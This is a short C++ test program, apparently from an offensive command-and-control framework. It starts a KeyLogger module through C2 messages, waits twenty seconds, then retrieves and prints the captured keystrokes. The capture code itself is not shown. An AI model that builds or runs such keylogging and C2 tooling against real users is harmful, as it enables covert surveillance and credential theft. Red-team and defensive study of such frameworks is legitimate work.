#include "../KeyLogger.hpp"

#ifdef __linux__
#elif _WIN32
#include <windows.h>
#endif

#include <thread> 
#include <chrono>  
 

bool testKeyLogger();

int main()
{
    bool res;

    std::cout << "[+] testKeyLogger" << std::endl;
    res = testKeyLogger();
    if (res)
       std::cout << "[+] Sucess" << std::endl;
    else
       std::cout << "[-] Failed" << std::endl;

    return 0;
}

bool testKeyLogger()
{

    std::unique_ptr<KeyLogger> keyLogger = std::make_unique<KeyLogger>();
    {
        C2Message c2Message;
        c2Message.set_instruction("keyLogger");
        c2Message.set_args("start");

        C2Message c2RetMessage;
        keyLogger->process(c2Message, c2RetMessage);

        std::this_thread::sleep_for (std::chrono::seconds(20));

        keyLogger->recurringExec(c2RetMessage) ;
        keyLogger->followUp(c2RetMessage);

        std::vector<std::string> splitedCmd;
        splitedCmd.push_back("keyLogger");
        splitedCmd.push_back("get");
        C2Message c2MessageFinal;
        keyLogger->init(splitedCmd, c2MessageFinal);

        std::cout << "Result:\n" << c2MessageFinal.returnvalue() << std::endl;
    }

    return true;
}
